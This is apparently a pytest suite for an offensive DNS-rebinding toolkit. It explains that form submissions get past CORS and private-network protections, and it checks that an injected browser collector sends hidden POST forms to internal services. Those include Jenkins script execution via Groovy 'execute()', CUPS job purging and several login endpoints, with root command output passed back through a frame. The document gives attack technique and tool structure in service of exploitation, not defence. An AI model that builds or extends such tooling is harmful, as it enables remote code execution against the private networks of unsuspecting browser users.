"""No-fetch attack paths, verified by execution.

A form submission is a navigation, so it is not preflighted, not CORS-checked and
not refused by the private/local network access rules the way fetch() is - which is
why it is the path that still lands when a fetch is blocked. These tests run the
REAL rendered collector under Node against a stubbed DOM and assert the form it
submitted, and that the same-origin frame answer came back.
"""
import json
import os
import shutil
import subprocess
import sys
import tempfile

import pytest

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, HERE)

from core import asset_path  # noqa: E402
from core import exploits as EX  # noqa: E402
from core import intel as I  # noqa: E402

pytestmark = pytest.mark.integration

ASSETS = os.path.dirname(asset_path("intel.js"))
HARNESS = os.path.join(HERE, "tests", "js_harness.js")
NODE = shutil.which("node")


# ======================================================== the library itself ===
class TestFormLibrary:

    def test_the_high_value_services_have_a_form_path(self):
        want = {8080: "scriptText-form", 3000: "login-form", 631: "purge-jobs",
                5984: "session-form", 8888: "login-form", 15672: "whoami-form"}
        for port, name in want.items():
            e = EX.build(port, "rebind.test")
            names = [f["name"] for f in e.get("forms", [])]
            assert name in names, (port, names)

    def test_the_jenkins_form_carries_a_groovy_script(self):
        e = EX.build(8080, "rebind.test")
        form = [f for f in e["forms"] if f["name"] == "scriptText-form"][0]
        assert form["url"] == "http://rebind.test:8080/scriptText"
        assert form["fields"]["script"].startswith("println")
        assert "execute()" in form["fields"]["script"]
        assert form["kind"] == "form"

    def test_the_forms_are_absolute_and_post(self):
        for port in (8080, 3000, 631):
            for f in EX.build(port, "rebind.test").get("forms", []):
                assert f["url"].startswith("http://rebind.test:"), f
                assert f["fields"] is not None

    def test_a_service_without_a_form_path_says_so(self):
        e = EX.build(2375, "rebind.test")        # Docker API is JSON-only
        assert not e.get("forms")

    def test_the_injected_plan_carries_the_forms(self):
        plan = I.exploit_plan("rebind.test", ports=[8080, 3000], limit=5)
        assert plan, "the plan is empty"
        jenkins = [p for p in plan if p["port"] == 8080][0]
        assert jenkins["forms"], jenkins
        assert jenkins["forms"][0]["fields"]["script"]
        assert jenkins["steps"], "the fetch steps must still be there"

    def test_the_plan_stays_bounded(self):
        plan = I.exploit_plan("rebind.test", limit=3)
        assert len(plan) <= 3
        for entry in plan:
            assert len(entry.get("forms", [])) <= 2


# ============================================== the collector, executed =======
@pytest.mark.skipif(NODE is None, reason="node is not installed")
class TestCollectorFormAttack:

    @staticmethod
    def _run(js, answer=""):
        with tempfile.NamedTemporaryFile("w", suffix=".js", delete=False) as f:
            f.write(js)
            path = f.name
        try:
            env = dict(os.environ, BH_FRAME_ANSWER=answer)
            p = subprocess.run([NODE, HARNESS, path], capture_output=True, text=True,
                               timeout=90, cwd=HERE, env=env)
        finally:
            os.unlink(path)
        assert p.stdout.strip(), f"harness printed nothing (stderr={p.stderr[:400]})"
        return json.loads(p.stdout.strip().splitlines()[-1])

    def _render(self, plan, sid="f" * 32):
        return I.render_js(os.path.join(ASSETS, "intel.js"), sid, kill_plan=plan,
                           randomize=False)

    def test_the_collector_submits_the_form(self):
        plan = I.exploit_plan("rebind.test", ports=[8080], limit=1)
        out = self._run(self._render(plan))
        assert out["ok"] is True, out.get("error")
        assert out["forms"], "the collector submitted no form"
        submitted = out["forms"][0]
        assert submitted["action"] == "http://rebind.test:8080/scriptText", submitted
        assert submitted["method"].upper() == "POST"
        assert submitted["fields"]["script"].startswith("println"), submitted
        assert submitted["target"], "the form must target the hidden frame"

    def test_the_answer_comes_back_through_the_frame(self):
        plan = I.exploit_plan("rebind.test", ports=[8080], limit=1)
        out = self._run(self._render(plan), answer="uid=0(root) gid=0(root)")
        blob = json.dumps(out)
        assert "uid=0(root)" in blob, "the same-origin frame answer was not reported"

    def test_several_services_submit_several_forms(self):
        plan = I.exploit_plan("rebind.test", ports=[8080, 3000, 631], limit=3)
        out = self._run(self._render(plan))
        actions = {f["action"] for f in out["forms"]}
        assert any("scriptText" in a for a in actions), actions
        assert any(":3000/" in a for a in actions), actions
        assert any(":631/" in a for a in actions), actions

    def test_without_a_plan_nothing_is_submitted(self):
        out = self._run(self._render([]))
        assert out["ok"] is True
        assert out["forms"] == []
